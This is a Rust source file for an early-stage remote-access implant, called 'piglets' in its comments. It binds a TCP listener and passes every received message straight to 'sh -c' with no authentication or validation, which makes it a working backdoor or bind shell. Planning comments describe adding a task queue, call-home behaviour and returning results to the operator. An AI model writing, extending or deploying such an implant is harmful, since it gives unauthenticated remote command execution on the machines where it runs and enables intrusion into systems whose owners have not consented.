// implants are called piglets, they can run code / execute stuff
// they have a list of tasks, bind_port, call_home_addr, protocol
//
use std::fmt;
use std::io::Read;
use std::net::TcpListener;
use std::net::TcpStream;
use std::process::Command;

#[derive(Debug)]
pub struct Piglet {
    pub id: String,
    pub bind_port: u16,
    pub call_home_addr: String,
}

impl fmt::Display for Piglet {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{} {} {}", self.id, self.bind_port, self.call_home_addr)
    }
}

fn handle_connection(mut stream: TcpStream) -> String {
    let mut buffer = [0; 1024];
    stream.read(&mut buffer).unwrap();
    let message = String::from_utf8_lossy(&buffer[..])
        .to_string()
        .trim_matches(char::from(0))
        .to_string();
    println!("{message}");
    message
}

fn main() {
    let id = "12345";
    let bind_port = 8080;
    let call_home_addr = "127.0.0.1";
    let piglet = Piglet {
        id: id.to_string(),
        bind_port,
        call_home_addr: call_home_addr.to_string(),
    };
    let listener =
        TcpListener::bind(format!("{}:{}", piglet.call_home_addr, piglet.bind_port,)).unwrap();
    // Result[OK] -> T -> unwrap takes this T or if Result[Err] panics with the Err
    // unwrap panics and does not handle errors gracefully -> no use plz, mr coder., gimme graceful error handling plz.

    // where does the SYN, SYN ACK, ACK happen?!
    for stream in listener.incoming() {
        let stream = stream.unwrap();
        let message = handle_connection(stream);
        //println!("{:?}", message);

        // next steps:
        // handle the stream and extract "Kommando"
        // how do we extract the body from the requests?
        // do we want to use raw HTTP requests or TCP Traffic?

        println!("Connection established!");

        // make this dynamic -> how?!
        Command::new("sh")
            .arg("-c")
            .arg(&message)
            .status()
            .expect("hello test");

        // send the result back to the "asker"
        // next -> task queue
    }
}

//println!("{} {} {}", piglet.id, piglet.bind_port, piglet.call_home_addr);

//println!("{}", piglet);

//println!("{:?}", piglet);
